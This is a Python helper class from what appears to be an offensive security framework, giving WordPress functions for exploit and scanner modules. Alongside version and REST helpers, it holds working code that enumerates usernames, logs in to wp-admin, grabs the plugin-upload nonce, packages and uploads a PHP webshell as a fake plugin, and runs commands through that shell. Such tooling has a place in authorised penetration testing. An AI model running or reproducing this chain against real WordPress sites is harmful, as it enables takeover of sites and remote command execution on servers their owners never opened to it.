#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

import io
import json
import re
import secrets
import time
import zipfile
from typing import Any, Dict, List, Optional
from urllib.parse import urlencode

from core.framework.base_module import BaseModule


class Wordpress(BaseModule):
    """WordPress HTTP helper methods for exploit/scanner modules."""

    @staticmethod
    def wp_normalize_base_path(path_value: str) -> str:
        value = (path_value or "/").strip()
        if value == "/":
            return "/"
        if not value.startswith("/"):
            value = "/" + value
        return "/" + value.strip("/")

    @staticmethod
    def wp_plugin_path(base_path: str, plugin_slug: str, *parts: str) -> str:
        root = Wordpress.wp_normalize_base_path(base_path)
        slug = (plugin_slug or "").strip("/")
        clean_parts = [part.strip("/") for part in parts if part and part.strip("/")]
        plugin_root = f"{root}/wp-content/plugins/{slug}"
        if clean_parts:
            return plugin_root + "/" + "/".join(clean_parts)
        return plugin_root

    @staticmethod
    def wp_extract_version_from_readme(readme_text: str):
        patterns = (
            r"^Stable tag:\s*([0-9][0-9A-Za-z\.\-_]*)",
            r"^Version:\s*([0-9][0-9A-Za-z\.\-_]*)",
        )
        for pattern in patterns:
            match = re.search(pattern, readme_text or "", flags=re.IGNORECASE | re.MULTILINE)
            if match:
                return match.group(1).strip()
        return None

    @staticmethod
    def wp_version_to_tuple(version: str):
        return tuple(int(part) for part in re.findall(r"\d+", version or ""))

    @staticmethod
    def wp_version_in_range(version: str, low: tuple, high: tuple) -> bool:
        """Return True when *version* is within [*low*, *high*] (inclusive, numeric tuple compare)."""
        current = Wordpress.wp_version_to_tuple(version)
        low_p = tuple(low) + (0,) * max(0, 3 - len(low))
        high_p = tuple(high) + (0,) * max(0, 3 - len(high))
        while len(current) < 3:
            current = current + (0,)
        return low_p[:3] <= current[:3] <= high_p[:3]

    def wp_json_index_path(self, base_path: str = None) -> str:
        root = Wordpress.wp_normalize_base_path(
            base_path if base_path is not None else getattr(self, "path", "/")
        )
        return f"{root}/wp-json/" if root != "/" else "/wp-json/"

    def wp_rest_has_namespace(self, namespace: str, base_path: str = None) -> bool:
        """True when ``/wp-json/`` lists the given REST namespace."""
        import json

        response = self.http_request(
            method="GET",
            path=self.wp_json_index_path(base_path),
            allow_redirects=True,
            timeout=float(getattr(self, "timeout", None) or 15),
        )
        if not response or response.status_code != 200:
            return False
        try:
            payload = response.json()
        except Exception:
            try:
                payload = json.loads(response.text or "")
            except Exception:
                return False
        if not isinstance(payload, dict):
            return False
        namespaces = payload.get("namespaces") or []
        return namespace in namespaces

    def wp_plugin_version(self, plugin_slug: str, base_path: str = None) -> str:
        """Read plugin version from readme.txt (Stable tag / Version)."""
        path = self.wp_plugin_path(
            base_path if base_path is not None else getattr(self, "path", "/"),
            plugin_slug,
            "readme.txt",
        )
        response = self.http_request(
            method="GET",
            path=path,
            allow_redirects=True,
            timeout=float(getattr(self, "timeout", None) or 15),
        )
        if not response or response.status_code != 200:
            return ""
        return self.wp_extract_version_from_readme(response.text or "") or ""

    def wp_path(self, suffix: str, base_path: str | None = None) -> str:
        root = self.wp_normalize_base_path(
            base_path if base_path is not None else getattr(self, "path", "/")
        )
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{root}{suffix}" if root != "/" else suffix

    def wp_rest_request(
        self,
        method: str,
        route: str,
        *,
        base_path: str | None = None,
        headers: Dict[str, str] | None = None,
        json_body: Any = None,
        params: Dict[str, Any] | None = None,
        timeout: float | None = None,
    ):
        route = route if route.startswith("/") else f"/{route}"
        to = timeout if timeout is not None else float(getattr(self, "timeout", None) or 20)
        for path in (
            self.wp_path(f"/wp-json{route}", base_path),
            self.wp_path(f"/?rest_route={route}", base_path),
        ):
            response = self.http_request(
                method=method,
                path=path,
                headers=headers,
                json=json_body,
                params=params,
                timeout=to,
                allow_redirects=True,
            )
            if not response:
                continue
            if int(response.status_code or 0) == 200:
                try:
                    json.loads(response.text or "")
                    return response
                except json.JSONDecodeError:
                    if "rest_route=" in path:
                        return response
            if int(response.status_code or 0) in (401, 403) and "rest_route=" not in path:
                continue
        return None

    def wp_find_open_comment_post(self, base_path: str | None = None) -> int:
        response = self.wp_rest_request(
            "GET",
            "/wp/v2/posts",
            base_path=base_path,
            params={"per_page": 20, "_fields": "id,comment_status"},
        )
        if response:
            try:
                rows = response.json()
            except Exception:
                rows = []
            if isinstance(rows, list):
                for row in rows:
                    if (
                        isinstance(row, dict)
                        and row.get("comment_status") == "open"
                        and row.get("id")
                    ):
                        return int(row["id"])
        return 0

    def wp_submit_comment(
        self,
        post_id: int,
        comment: str,
        *,
        base_path: str | None = None,
        author: str = "",
        email: str = "",
    ) -> bool:
        author = author or f"ks{secrets.token_hex(3)}"
        email = email or f"{author}@example.test"
        data = urlencode(
            {
                "comment": comment,
                "author": author,
                "email": email,
                "url": "",
                "comment_post_ID": str(post_id),
                "comment_parent": "0",
            }
        )
        response = self.http_request(
            method="POST",
            path=self.wp_path("/wp-comments-post.php", base_path),
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
        )
        code = int(response.status_code or 0) if response else 0
        return code in (200, 302, 303)

    def wp_poll_response(
        self,
        path: str,
        *,
        params: Dict[str, str] | None = None,
        needle: str = "",
        wait_seconds: int = 45,
        interval: float = 3.0,
    ) -> bool:
        deadline = time.time() + max(5, int(wait_seconds))
        while time.time() < deadline:
            response = self.http_request(
                method="GET",
                path=path,
                params=params,
                timeout=10,
            )
            if response and int(response.status_code or 0) == 200:
                if not needle or needle in (response.text or ""):
                    return True
            time.sleep(interval)
        return False

    def wp_enum_user_slugs(self, base_path: str | None = None) -> List[str]:
        found: List[str] = []
        seen = set()

        def add(value: str | None) -> None:
            if not value:
                return
            slug = str(value).strip().split("/")[-1]
            if not slug or slug in seen:
                return
            if not re.match(r"^[\w.@+-]{1,60}$", slug):
                return
            seen.add(slug)
            found.append(slug)

        response = self.wp_rest_request(
            "GET",
            "/wp/v2/users",
            base_path=base_path,
            params={"per_page": "100"},
            timeout=12,
        )
        if response:
            try:
                users = response.json()
            except Exception:
                users = None
            if isinstance(users, list):
                for row in users:
                    if isinstance(row, dict):
                        add(row.get("slug"))
                        add(row.get("name"))
        for uid in range(1, 12):
            response = self.http_request(
                method="GET",
                path=self.wp_path(f"/?author={uid}", base_path),
                timeout=8,
                allow_redirects=False,
            )
            if response:
                match = re.search(
                    r"/author/([^/?#]+)",
                    (response.headers or {}).get("Location", ""),
                )
                if match:
                    add(match.group(1))
        for candidate in ("admin", "administrator"):
            add(candidate)
        return found

    def wp_admin_login(
        self, username: str, password: str, base_path: str | None = None
    ) -> bool:
        login = self.wp_path("/wp-login.php", base_path)
        redirect = self.wp_path("/wp-admin/", base_path)
        self.http_request(method="GET", path=login, session=True, timeout=15)
        response = self.http_request(
            method="POST",
            path=login,
            data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": redirect,
                "testcookie": "1",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            session=True,
            timeout=20,
        )
        if not response:
            return False
        session = getattr(response, "session", None)
        if session:
            for cookie in session.cookies:
                if str(cookie.name).startswith("wordpress_logged_in"):
                    return True
        url = getattr(response, "url", "") or ""
        body = (response.text or "").lower()
        return "wp-admin" in url or "dashboard" in body

    def wp_plugin_upload_nonce(self, base_path: str | None = None) -> str:
        page = self.http_request(
            method="GET",
            path=self.wp_path("/wp-admin/plugin-install.php?tab=upload", base_path),
            session=True,
            timeout=20,
        )
        if not page:
            return ""
        match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', page.text or "")
        return match.group(1) if match else ""

    @staticmethod
    def wp_webshell_plugin_zip(slug: str, php_body: str) -> bytes:
        buffer = io.BytesIO()
        slug = slug.strip().strip("/")
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(f"{slug}/{slug}.php", php_body)
            archive.writestr(f"{slug}/readme.txt", "Stable tag: 1.0\n")
        return buffer.getvalue()

    def wp_upload_plugin_shell(
        self, slug: str, php_body: str, base_path: str | None = None
    ) -> Optional[str]:
        nonce = self.wp_plugin_upload_nonce(base_path)
        if not nonce:
            return None
        files = {
            "pluginzip": (
                f"{slug}.zip",
                self.wp_webshell_plugin_zip(slug, php_body),
                "application/zip",
            )
        }
        data = {
            "_wpnonce": nonce,
            "_wp_http_referer": "/wp-admin/plugin-install.php?tab=upload",
            "install-plugin-submit": "Install Now",
        }
        self.http_request(
            method="POST",
            path=self.wp_path("/wp-admin/update.php?action=upload-plugin", base_path),
            data=data,
            files=files,
            session=True,
            timeout=40,
        )
        shell_path = self.wp_plugin_path(
            base_path if base_path is not None else getattr(self, "path", "/"),
            slug,
            f"{slug}.php",
        )
        probe = self.http_request(method="GET", path=shell_path, timeout=15)
        if probe and int(probe.status_code or 0) == 200:
            return shell_path
        return shell_path

    def wp_shell_exec(
        self, shell_path: str, command: str, *, param: str = "c"
    ) -> str:
        response = self.http_request(
            method="GET",
            path=shell_path,
            params={param: command},
            timeout=25,
        )
        return (response.text or "").strip() if response else ""

    # Backward-compatible aliases
    normalize_base_path = wp_normalize_base_path
    plugin_path = wp_plugin_path
    extract_version_from_readme = wp_extract_version_from_readme
    version_to_tuple = wp_version_to_tuple
